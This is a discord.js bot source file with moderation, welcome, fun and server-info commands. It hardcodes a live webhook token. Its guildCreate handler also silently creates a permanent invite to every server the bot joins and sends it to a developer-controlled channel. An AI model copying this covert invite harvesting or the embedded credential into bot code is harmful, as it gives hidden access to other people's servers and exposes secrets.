const Discord = require('discord.js'),
      Chance = require('chance'),
      random = new Chance(),
      parseArgs = require('minimist'),  
      arraySort = require('array-sort'), 
      table = require('table'), 
      send = require('quick.hook');
const config = require("./config");
const fs = require("fs");
const client = new Discord.Client();
const ms = require("ms");
const encode = require('strict-uri-encode');
const snekfetch = require('snekfetch');
const superagent = require("superagent");
const meme = require('memejs');
const gifSearch = require("gif-search");

const hook = new Discord.WebhookClient('447643495528923146', 'Bendsxen4drwRTJVLOM5f9_Ns0gfPYkWPdOABYo8pJahGi0jKX5ZgWQWwvL85xcESUAi');

hook.send(`📡 **RD-BOT** • Restarting Successfully... !`);

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag} on ${client.guilds.size} Servers ..`);
   
   client.user.setActivity(`${config.prefix}help`, { type: 'WATCHING' })
  });

client.on("guildCreate", async guild => {
  const invite = await guild.channels.first().createInvite({
    maxAge: 0
  });
  client.channels.get('448075110096830465').send(`Bot Has Invite To New Guild  •  **${guild.name}**   with invite: https://discord.gg/${invite.code}`)

});

client.on("guildMemberAdd", async member => {
    let memberjoin = member.guild.channels.find('name', "new-member");
const embed = new Discord.RichEmbed()
.setThumbnail(member.user.avatarURL)
.setColor('#1f49a1')
.setFooter('🔵 MEMBER JOIN !')
.setTimestamp()
    .setDescription(`**[ ${member} ]** \nWELCOME TO **${member.guild.name}** SERVER  , YOU ARE A MEMBER : **${member.guild.memberCount}**\n• You Want To Help Please Content Server Owner : **${member.guild.owner.user.tag}** `);
memberjoin.sendEmbed(embed);
});   

client.on("guildMemberRemove", async member => {
    let memberjoin = member.guild.channels.find('name', "new-member");
const embed = new Discord.RichEmbed()
.setThumbnail(member.user.avatarURL)
.setColor('#FF0000')
.setFooter('🔴 MEMBER LEFT !')
.setTimestamp()
    .setDescription(`**[ ${member} ]** HAS LEFT **${member.guild.name}** SERVER  , THE SERVER NOW : **${member.guild.memberCount}** USER ! `);
memberjoin.send(embed);
});    

client.on("message", async message => {
    if(message.author.bot) return;
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase(); 

       if(command === "gif") {
  if (message.author.bot) return;
  if (message.channel.type == "dm") return;

    if (!args[0]) return message.channel.send("`"+config.prefix+"gif <gname>`");

    gifSearch.random(args[0]).then(
        gifUrl => {

        let randomcolor = ((1 << 24) * Math.random() | 0).toString(16) //Optional
        var embed = new Discord.RichEmbed()
            .setColor(`#${randomcolor}`)
            .setImage(gifUrl)
        message.channel.send(embed);
    });
 }
      
   if(command === "status" ) {
   // if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send(`You Don\'t have permissions **Manage Message** To Use This Commands`);
    if(!args[0]) {
       const statushelp = new Discord.RichEmbed()
       .setTitle(`Facebook Status xD : **${config.prefix}status <STATUS>**`)
        return message.channel.send(statushelp).then(msg => msg.delete(8000));
    }
    let status = args.join(" ");
    message.delete();
    let announceEmbed = new Discord.RichEmbed()
    .setColor(`RANDOM`)
    .setFooter(`${message.author.username} Status :`, message.author.avatarURL)
    .setTimestamp()
    .setTitle(status)

    let m = await message.channel.send(announceEmbed);
    await m.react(`👍`);
    await m.react(`❤`);
    await m.react(`😂`);
    await m.react(`😮`);
    await m.react(`😢`);
    await m.react(`😡`);

}
//not allow
  if(command === "magik") {
    let target = message.mentions.users.first() || message.author;
    let wait = await message.channel.send('Jam Tix Anh Ping Edit.....xD')
    let userAvatar = (target.displayAvatarURL);
    if (['jpg', 'jpeg', 'gif', 'png'].some(x => args.join(' ').includes(x))) {
        userAvatar = args.join(' ').replace(/gif|webp/g, 'jpg')
    }
    let res = await snekfetch.get(`https://discord.services/api/magik?url=${userAvatar}`)
            await wait.delete()
            const magikEmbed = new Discord.RichEmbed() 
                .setColor('RANDOM')
                .setImage(`https://discord.services/api/magik?url=${userAvatar}`); 
            return message.channel.send(magikEmbed) 
}

   if(command == "annto") {
         message.delete()
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("you don't have permssion MANAGE_MESSAGE to use this !");
    if(args[0] == "help"){
    message.reply("```Create #annoucements first and do +++annto on the channel you want message sand to #announcements```");
    return;
  }
    let chatchannel = message.guild.channels.find(`name`, "announcements");
    if(!chatchannel) return message.channel.send("you need create channel #announcements to chat !");
    message.delete().catch(O_o=>{});
    chatchannel.send(args.join(" "));

   }

   if(command == "chatto" || command === "chatsay") {
         message.delete()
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("you don't have permssion MANAGE_MESSAGE to use this !");
    if(args[0] == "help"){
    message.reply("```Create #chat first and do +++chatto on the channel you want message sand to #chat```");
    return;
  }
    let chatchannel = message.guild.channels.find(`name`, "chat");
    if(!chatchannel) return message.channel.send("you need create channel #chat to chat !");
    message.delete().catch(O_o=>{});
    chatchannel.send(args.join(" "));

   }

if(command === "say") {   
      message.delete()
      if(!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**You do not have permission to do that!**");
      let say = args.join(' ')
message.channel.send(say);
}
      
  if(command === "ctc" || command === "create textchannel") {
  let logs = args.join(" ");
  if(!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**You do not have permission to do that!**");
  message.guild.createChannel(logs, 'text');
  message.channel.send(`✅ **${message.author.username}** Has Create Text Channel **${logs}**`).then(msg => msg.delete(8000));

}

     if(command === "ping") {
    message.delete(6000);
     const newemb = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setTitle(`🎾 Pong | ${Date.now() - message.createdTimestamp} ms`)
      .setFooter(`Requested by ${message.author.username}`)
      message.channel.send({embed: newemb}).then(message => message.delete(7002));
      message.react("446258205333520384");
 }

    if(command === "setplaying" || command === "sp") {
   //  if (message.author.id !== ('356510829920780289')) return message.channel.send("**You Can\'t Change Watching BOT | Dev is • TaMoToJiᵛᵉʳᶦᶠᶦᵉᵈ林坓龙#5881**").then(msg => msg.delete(8000));
 if (!['356510829920780289', '455087193178898452'].includes(message.author.id)) return message.reply(`Sorry U Dont Have Permission To Do This Command Only Dev lets do +++dev for see who is dev`).then(msg => msg.delete(9000));   
    const status = args.join(' ');
     if (status.length === 0) {
       const embed = new Discord.RichEmbed()
         .setColor('RANDOM')
         .setDescription(`${config.prefix}setplaying [status]!`);
       message.channel.send({ embed });
       message.delete(500)
  }
  
    else if (status.length !== 0) {
    client.user.setActivity(`${status}`, {  type: "PLAYING"});
    const embed = new Discord.RichEmbed()
      .setColor("#7289DA")
      .setDescription(`**${message.author.tag}** You Sucessfully Changed PLAYING  •  **${status}** !`);
    message.channel.send({ embed });
    message.delete(5000);
  }};

  if(command === "bond") {
  if(!args[0]) return message.channel.send("**Mention a user or users that you want to bond.** `PREFIX bond <user> <user>`")

   var bondLevel = Math.floor(Math.random() * 102);
   let user1 = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
   let user2 = message.guild.member(message.guild.members.get(args[1]));
   let user3 = message.guild.member(message.guild.members.get(args[2]));

    if (bondLevel > 100 ) {
        var ship = 'Perfect Couple <3_<3 :ok_hand:'
        var bondLevelResults = `♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥`
    } else
    if (bondLevel == 100) {
        var ship = 'Lit Couple <3 :ok_hand:'
        var bondLevelResults = `♥♥♥♥♥♥♥♥♥♥`
    } else
    if (bondLevel >= 90 && bondLevel < 100) {
        var ship = 'Great Couple <3'
        var bondLevelResults = `♥♥♥♥♥♥♥♥♥🖤`
    } else
    if (bondLevel >= 80 && bondLevel < 90) {
        var ship = 'Great Couple <3'
        var bondLevelResults = `♥♥♥♥♥♥♥♥🖤🖤`
    } else
    if (bondLevel >= 75 && bondLevel < 80) {
        var ship = 'Great Couple <3'
        var bondLevelResults = `♥♥♥♥♥♥♥🖤🖤🖤`
    } else
    if (bondLevel >= 70 && bondLevel < 75) {
        var ship = 'A littly risky but can work out! '
        var bondLevelResults = `♥♥♥♥♥♥♥🖤🖤🖤`
    } else
    if (bondLevel >= 60 && bondLevel < 70) {
        var ship = 'Eh.'
        var bondLevelResults = `♥♥♥♥♥♥🖤🖤🖤🖤`
    } else
    if (bondLevel >= 50 && bondLevel < 60) {
        var ship = 'Eh. '
        var bondLevelResults = `♥♥♥♥♥🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 40 && bondLevel < 50) {
        var ship = 'Eh. '
        var bondLevelResults = `♥♥♥♥🖤🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 30 && bondLevel < 40) {
        var ship = 'Eh. '
        var bondLevelResults = `♥♥♥🖤🖤🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 25 && bondLevel < 30) {
        var ship = 'No Comment'
        var bondLevelResults = `♥♥🖤🖤🖤🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 20 && bondLevel < 25) {
        var ship = 'Rip'
        var bondLevelResults = `♥♥🖤🖤🖤🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 10 && bondLevel < 20) {
        var ship = 'Rip'
        var bondLevelResults = `♥🖤🖤🖤🖤🖤🖤🖤🖤🖤`
    } else
    if (bondLevel >= 0 && bondLevel < 10) {
        var ship = 'Not even possible...'
        var bondLevelResults = `🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤`
    }


    if(!args[1]){
        var bondEmbed = new Discord.RichEmbed()

        .setColor("#FF0000")
        .addField("Users", `${message.author} x ${args[0]}`)
        .addField("Bond Score", `${bondLevel}%`)
        .addField("Bond Bar", bondLevelResults)
        .addField("Summary", ship);


        return message.channel.send(bondEmbed)
    }

    if(!args[2]){
        var bondEmbed2 = new Discord.RichEmbed()

        .setColor("#FF0000")
        .addField("Users", `${args[0]} x ${args[1]}`)
        .addField("Bond Score", `${bondLevel}%`)
        .addField("Bond Bar", bondLevelResults)
        .addField("Summary", ship);


        return message.channel.send(bondEmbed2)
    }


    if(!args[3]) {

        var bondEmbed3 = new Discord.RichEmbed()

        .setColor("#FF0000")
        .addField("Users", `${args[0]} x ${args[1]} x ${args[2]}`)
        .addField("Bond Score", `${bondLevel}%`)
        .addField("Bond Bar", bondLevelResults)
        .addField("Summary", ship);


        return message.channel.send(bondEmbed)
    }
}
   if(command === "lewd") {
    let {body} = await superagent
    .get(`https://nekos.life/api/lewd/neko`);
    if (!message.channel.nsfw) return message.reply("You can use this command only on nsfw channels!");
  
    let hentaiEmbed = new Discord.RichEmbed()
    .setColor("#ff9900")
    .setTitle("Why does someone put a command like this?")
    .setImage(body.neko)
    .setFooter("Bot Version: 0.0.2");

    message.channel.send(hentaiEmbed);

}

  if(command === "meme") {
  meme(function(data) {
  const embed = new Discord.RichEmbed()
  .setTitle(data.title[0])
  .setColor("RANDOM")
  .setImage(data.url[0])
  message.channel.send({embed});
 // message.delete();
  })};

   if(command === "serverinfo") {
      let online = message.guild.members.filter(member => member.user.presence.status !== 'offline');
      let day = message.guild.createdAt.getDate()
      let month = 1 + message.guild.createdAt.getMonth()
      let year = message.guild.createdAt.getFullYear()
       let sicon = message.guild.iconURL;
       let serverembed = new Discord.RichEmbed()
       .setAuthor(message.guild.name, sicon)
       .setFooter(`Server Created : Day:${day} | Month:${month} | Year:${year}`)
       .setColor('#FF0000')
       .setThumbnail(sicon)
       .addField("ServerName", message.guild.name, true)
       .addField("OWNER", message.guild.owner.user.tag, true)
       .addField("Region", message.guild.region, true)
       .addField("Channels", message.guild.channels.size, true)
       .addField("MEMBER", message.guild.memberCount, true)
       .addField("Humans", message.guild.memberCount - message.guild.members.filter(m => m.user.bot).size, true)
       .addField("BOT", message.guild.members.filter(m => m.user.bot).size, true)
       .addField("Online", online.size, true)
       .addField("Created At", message.member.joinedAt, true)

       message.channel.send(serverembed);
    
    }

    if(command === "clear") {
        if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("```You Don\'t Have Permissions [Message_Message] To Clear Message !```");
        if(!args[0]) return message.channel.send(`**Example :**\n${config.prefix}clear 10\n${config.prefix}clear 100 \n\n**Limite To Clear 2 to 100**`);
        message.channel.bulkDelete(args[0]).then(() => {
       message.channel.send(`${message.author.username} Has Been Clear Message To ▫ **${args[0]}** .`).then(msg => msg.delete(2000));
    });
}

      if(command === "random") {
    const embed = new Discord.RichEmbed()
        .setColor(0xffffff)
    if (!args[0] || args[0].toLowerCase() === 'list') {
        let resp = Object.keys(Object.getPrototypeOf(random))
        resp.shift();
        embed.setDescription(resp.join(',  '))
             .setTitle(`${config.prefix}random List `);
        return message.channel.send(embed)      
    }
    let item = args[0];
    args.shift();
    let options = parseArgs(args);
    delete options['_'];
    let response;
    try {
        response = random[item.toLowerCase()](options);
    } catch (e) {
        response = `Sorry, I can't return a random ${item}`;
    }
    if (typeof response === 'object') { // Parse Objects
        response = JSON.stringify(response, null, 4);
        embed.setDescription(`\`\`\`js\n${response}\`\`\``)
    } else { // Run if NOT an object
        embed.setFooter(response);   
    }
    message.channel.send(embed);
    
}

  if (command === "ignn") {
  message.delete();
    if(args[0] == "help"){
  const help = new Discord.RichEmbed()
  .setDescription(`**${config.prefix}ign** [**IGN-PUBG**]  [**IGN-FORTNITE**]  [**IGN-CSGO**]  [**IGN-GTAV**]  [**IGN-DOTA2**]  [**NAME-STEAMG**]\n\nExample : ${config.prefix}ign pubg fortnite csgo gtav dota2 steamacc`)
  .setColor('RANDOM')
  message.channel.send(help).then(msg => msg.delete(11000));
    return;
  }
  let pubg = args[0];
  let fortnite = args[1];
  let csgo = args[2];
  let gtav = args[3];
  let dota = args[4];
  let steam = args[5];

  const ign = new Discord.RichEmbed()
  .setColor('RANDOM')
  .setAuthor(`${message.author.tag} - IGN :`, message.author.avatarURL)
  .setThumbnail(message.author.avatarURL)
  .addField("<:pubg:445459131931820044> PUBG IGN :", pubg, true)
  .addField("<:fortnite:445468274029887488> FORTNITE IGN :", fortnite, true)
  .addField("<:csgo:445457715574079509> CS-GO IGN :", csgo, true)
  .addField("<:gtav:445457716534575115> GTA V IGN :", gtav, true)
  .addField("<:dota:445457915285864458> DOTA 2 IGN :", dota, true)
  .addField("<:steam:445457979224096779> STEAM NAME :", steam, true)
  .setFooter("@ = [SPAEC] ")
  .setTimestamp()
    const pollTitle = await message.channel.send(ign);
      await pollTitle.react(`445459131931820044`);
      await pollTitle.react(`445468274029887488`);
      await pollTitle.react(`445457715574079509`);
      await pollTitle.react(`445457716534575115`);
      await pollTitle.react(`445457915285864458`);
      await pollTitle.react(`445457979224096779`);
    const filter = (reaction) => reaction.emoji.name === '445459131931820044';
    const collector = pollTitle.createReactionCollector(filter, { time: 1500 });

    const filter1 = (reaction) => reaction.emoji.name === '445468274029887488';
    const collector1 = pollTitle.createReactionCollector(filter1, { time: 1500 });

    const filter2 = (reaction) => reaction.emoji.name === '445457715574079509';
    const collector2 = pollTitle.createReactionCollector(filter2, { time: 1500 });

    const filter3 = (reaction) => reaction.emoji.name === '445457716534575115';
    const collector3 = pollTitle.createReactionCollector(filter3, { time: 1500 });

    const filter4 = (reaction) => reaction.emoji.name === '445457915285864458';
    const collector4 = pollTitle.createReactionCollector(filter4, { time: 1500 });

    const filter5 = (reaction) => reaction.emoji.name === '445457979224096779';
    const collector5 = pollTitle.createReactionCollector(filter5, { time: 1500 });
   
}

  if(command === "avatar") {
    let msg = await message.channel.send("Waitng avatar...");
    let mentionedUser = message.mentions.users.first() || message.author;

    let avatarEmbed = new Discord.RichEmbed()
    .setImage(mentionedUser.displayAvatarURL)
    .setColor(`RANDOM`)
    .setTitle(`Avatar`)
    .setDescription("[Avatar Link]("+mentionedUser.displayAvatarURL+")")
    .setFooter(`Requested by ${message.author.tag}`);
    message.channel.send(avatarEmbed)
    msg.delete();
}

   if(command === "help") {
    const serverEmbed = new Discord.RichEmbed()
    .setAuthor(`${config.prefix}commands`, message.author.avatarURL)
    .setColor('#FFE8A0')
    .addField("Moderation", "`clear` `say` `newvideo - nv` `youtubechannel - ytc` `chatto` `annto` ")
    .addField("Info", "`serverinfo`  `serverrule`  `inviteslist` `dev`")
    .addField("General", "`ping` `avatar` `emojilist` ")
    .addField("Fun", "`bond` `meme`  `status`  `get`  `random`")
    .setFooter(`Requested by : ${message.author.tag}`);

    return message.channel.send(serverEmbed);
}

  if(command === "get") {
  let [title, contents] = args.join(" ").split("|");
  if(!contents) {
    [title, contents] = ["Achievement Get :", title];
  }
  let rnd = Math.floor((Math.random() * 39) + 1);
  if(args.join(" ").toLowerCase().includes("burn")) rnd = 38;
  if(args.join(" ").toLowerCase().includes("cookie")) rnd = 21;
  if(args.join(" ").toLowerCase().includes("cake")) rnd = 10;

  if(title.length > 22 || contents.length > 22) return message.edit("Max Length: 22 Characters. Soz.").then(message.delete.bind(message), 2000);
  const url = `https://www.minecraftskinstealer.com/achievement/a.php?i=${rnd}&h=${encodeURIComponent(title)}&t=${encodeURIComponent(contents)}`;
  snekfetch.get(url)
   .then(r=>message.channel.send("", {files:[{attachment: r.body}]}));
  message.delete(5000);
  message.react("445426199892590602");

}

if(command === "dev" || command === "developer") {
  const dev = new Discord.RichEmbed()
  .setColor('RANDOM')
  .addField(`BOT DEVELOPER :`, "• steven#2006\n• TaMoToJiᵛᵉʳᶦᶠᶦᵉᵈ林坓龙#5881")
  //.addField(`• Facebook`, "[CLICK HERE TO VIEW](https://www.facebook.com/tamotoji168)")
 // .addField(`• Discord`, "[CLICK HERE TO VIEW](https://discord.gg/ZWWD7zT)")
 // .setImage("https://cdn.discordapp.com/attachments/446881833213231105/447046532814995456/TAMOTOJI-PROFILE.jpg")
  message.channel.send(dev);
}

     if(command === "topinvites" || command === "inviteslist") {
    let invites = await message.guild.fetchInvites().catch(error => { // This will store all of the invites into the variable
        return message.channel.send('Sorry, I don\'t have the proper permissions to view invites!');
    }) // This will store all of the invites into the variable
    invites = invites.array();
    arraySort(invites, 'uses', { reverse: true }); // Be sure to enable 'reverse'
    let possibleInvites = [['User', 'Invite']]; // Each array object is a rown in the array, we can start up by setting the header as 'User' & 'Uses'
    invites.forEach(function(invite) {
        possibleInvites.push([invite.inviter.username, invite.uses]); // This will then push 2 items into another row
    })
    const embed = new Discord.RichEmbed()
        .setColor(0xCB5A5E)
        .addField('<:trophyrd:447240380086222858> Leaderboard <:trophyrd:447240380086222858>', `\`\`\`${table.table(possibleInvites)}\`\`\``);
    send(message.channel, embed, {
        name: 'Server Invites',
        icon: 'https://image.flaticon.com/icons/png/512/262/262831.png'
    })
    
}

if(command === "newvideo" || command === "nv") {
message.delete()
if(args[0] == "help"){
  message.channel.send("**Enter • <YTUsername> <VideoURL>**").then(msg => msg.delete(11000));
    return;
  }
  let username = args[0]; 
  let videoURL = args[1];
 
    send(message.channel, ` @here\n\n<:sparkles_fiery:447631785682010150>Username • **${username}** Has Upload Video From YouTube !<:sparkles_fiery:447631785682010150>\n\n${videoURL} __**Go Check Now**__`, {
        name: 'YouTube',
        icon: 'https://cdn.discordapp.com/attachments/434019301448613908/447626767222439947/image.jpg'
     
    })
}

if(command === "ytc" || command === "youtubechaanel") {
message.delete()
if(args[0] == "help"){
  message.channel.send("**Enter • <YTUsername> <chnanelURL>**").then(msg => msg.delete(11000));
    return;
  }
  let username = args[0]; 
  let channelURL = args[1];
 
    send(message.channel, `@here\n\n•  Support YouTube Channel : **${username}**\n\n👍 **LIKE**\n🔗 **SHERE**\n<:YouTube:447636911838724097> **SUBSCRIBE**\n\n__**CHANNEL-URL**__  •  ${channelURL} !`, {
        name: 'YouTubeChannel',
        icon: 'https://cdn.discordapp.com/attachments/434019301448613908/447626767222439947/image.jpg'
     
    })
}


if(command === "serverrule") {
    const serverrule = new Discord.RichEmbed()
    .setColor('RANDOM')
  //  .setImage('https://cdn.discordapp.com/attachments/443665749656207360/445215855534407690/ServerRules-Mirai.png')
    .setDescription("**ServerRule :**\n\n1. No Bullying\n2. No Spamming\n3. No Aggressive Fighting\n4. No Threats\n5. No Racist or Offensive or Degrading Content\n6. No Begging or Repeated Asking\n7. Any Sort of Abuse is Not Allowed\n8. Use Appropriate Channels\n9. No Punishment Evading\n10. No Links That Are Evasive\n11. Staff Decisions Are Final\n\nMore Check #server-rule")   
    const pollTitle = await message.channel.send(serverrule);
      await pollTitle.react(`444878652090613763`);
      await pollTitle.react(`444873045488697375`);
      await pollTitle.react(`444873046776348679`);
      await pollTitle.react(`444873175747133471`);
      await pollTitle.react(`444873284622745610`);
    const filter = (reaction) => reaction.emoji.name === '444878652090613763';
    const collector = pollTitle.createReactionCollector(filter, { time: 1500 });
    const filter1 = (reaction) => reaction.emoji.name === '444873045488697375';
    const collector1 = pollTitle.createReactionCollector(filter1, { time: 1500 });
    const filter3 = (reaction) => reaction.emoji.name === '444873046776348679';
    const collector3 = pollTitle.createReactionCollector(filter3, { time: 1500 });
    const filter4 = (reaction) => reaction.emoji.name === '444873175747133471';
    const collector4 = pollTitle.createReactionCollector(filter4, { time: 1500 });
    const filter5 = (reaction) => reaction.emoji.name === '444873284622745610';
    const collector5 = pollTitle.createReactionCollector(filter5, { time: 1500 });
    message.delete(800);
};

   if(command === "emojilist") {
        const List = message.guild.emojis.map(e => e.toString()).join(" ");
        let sicon = message.guild.iconURL;
        const EmojiList = new Discord.RichEmbed() 
            .setTitle('➠ Server Emoji\'s List') 
            .setColor('RANDOM')
            .setAuthor(message.guild.name, sicon)
            .setDescription(List) 
            .setTimestamp() 
            .setFooter(message.guild.name) 
        message.channel.send(EmojiList); 
        message.react("📥");
  }

  if(command === "addrole") {
  if(!message.member.hasPermission("MANAGE_ROLES")) return message.channel.send("**You don't have premmsions to do that!**");
  let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  if(!args[0]) return message.channel.send(`**Mention a user, and type a role to give to the user.** ${config.prefix}addrole <user> <role>`)
  if(!rMember) return message.channel.send(`**User not found.** ${config.prefix}addrole <user> <role>`);
  let role = args.join(" ").slice(22);
  if(!role) return message.channel.send(`**Specify a role!** ${config.prefix}addrole <user> <role>`);
  let gRole = message.guild.roles.find(`name`, role);
  if(!gRole) return message.channel.send(`**Role not found.** ${config.prefix}addrole <user> <role>`);

  if(rMember.roles.has(gRole.id)) return message.channel.send("This user already has that role.");
  await(rMember.addRole(gRole.id));

  message.channel.send(`**${rMember}** has the role **${gRole.name}** now!`)
  message.delete(800);
}
  
  if(command === "removerole") {
  if(!message.member.hasPermissions("MANAGE_ROLES")) return message.reply("You do not have permission to do that!");
  let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  if(!rMember) return message.reply("User not found.");
  let role = args.join(" ").slice(22);
  if(!role) return message.reply("Specify a role!");
  let gRole = message.guild.roles.find(`name`, role);
  if(!gRole) return message.reply("Role not found.");

  if(!rMember.roles.has(gRole.id)) return message.reply("This user doesn't have that role.");
  await(rMember.removeRole(gRole.id));

  await message.channel.send(`**${rMember} deos not have the role, ${gRole.name} anymore!**`)
  message.delete(800);

}

  //if(command === "ctc" || command === "createtextchannel") {
 // let logs = args.join(" ");
 // if(!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**You do not have permission to do that!**");
 // message.guild.createChannel(logs, 'text');
 // message.channel.send(`✅ **${message.author.username}** Has Create Text Channel **${logs}**`).then(msg => msg.delete(8000));

//}

});

client.login(process.env.TOKEN);
